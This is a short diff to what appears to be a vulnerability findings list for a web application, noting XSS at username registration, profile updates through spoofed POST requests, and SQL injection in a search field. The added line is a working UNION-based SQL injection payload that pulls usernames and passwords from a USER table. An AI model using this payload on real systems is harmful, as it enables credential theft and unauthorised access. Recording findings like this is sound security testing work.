@@ -3,3 +3,4 @@ XSS: Register Username
 Any user can update any user's profile by spoofing the post request.
 
 SQLi in search field
+xxx %') AND 1=2 UNION SELECT 1,null,username,1234,password,null FROM USER--
